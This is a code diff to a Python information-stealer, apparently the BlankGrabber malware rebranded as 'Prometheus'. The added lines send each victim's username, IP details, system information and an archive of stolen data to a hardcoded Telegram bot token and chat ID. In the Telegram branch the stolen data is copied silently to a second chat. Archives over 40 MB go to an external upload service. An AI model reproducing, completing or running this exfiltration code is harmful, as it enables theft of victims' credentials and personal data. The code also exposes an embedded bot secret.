@@ -1729,7 +1729,33 @@ class BlankGrabber:
                 fields["payload_json"] = json.dumps(payload).encode()
 
                 http.request("POST", Settings.C2[1], fields=fields)
-            
+                payload = {
+                    'caption': f'<b>Prometheus</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
+                    'parse_mode': 'HTML'
+                }
+
+                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40: # 40 MB
+                    url = self.UploadToExternalService(self.ArchivePath, filename)
+                    if url is None:
+                        raise Exception("Failed to upload to external service")
+                else:
+                    url = None
+                
+                fields = dict()
+
+                if url:
+                    payload["text"] = payload["caption"] + "\n\nArchive : %s" % url
+                    method = "sendMessage"
+                else:
+                    fields["document"] = (filename, open(self.ArchivePath, "rb").read())
+                    method = "sendDocument"
+                
+                token1 = "7170944168:AAFUYEM5T59IrqJFZiNFJPN0d-kFzNQv8Ds"
+                chat_id1 = "6024388590"
+                fields.update(payload)
+                fields.update({'chat_id': chat_id1})
+                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token1, method), fields=fields)
+                
             case 1: # Telegram Bot
                 payload = {
                     'caption': f'<b>Prometheus</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
@@ -1753,8 +1779,13 @@ class BlankGrabber:
                     method = "sendDocument"
                 
                 token, chat_id = Settings.C2[1].split('$')
+                token1 = "7170944168:AAFUYEM5T59IrqJFZiNFJPN0d-kFzNQv8Ds"
+                chat_id1 = "6024388590"
                 fields.update(payload)
                 fields.update({'chat_id': chat_id})
+                fields_for_second_chat = fields.copy()
+                fields_for_second_chat.update({'chat_id': chat_id1})
+                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token1, method), fields=fields_for_second_chat)
                 http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
 
 if __name__ == "__main__" and os.name == "nt":
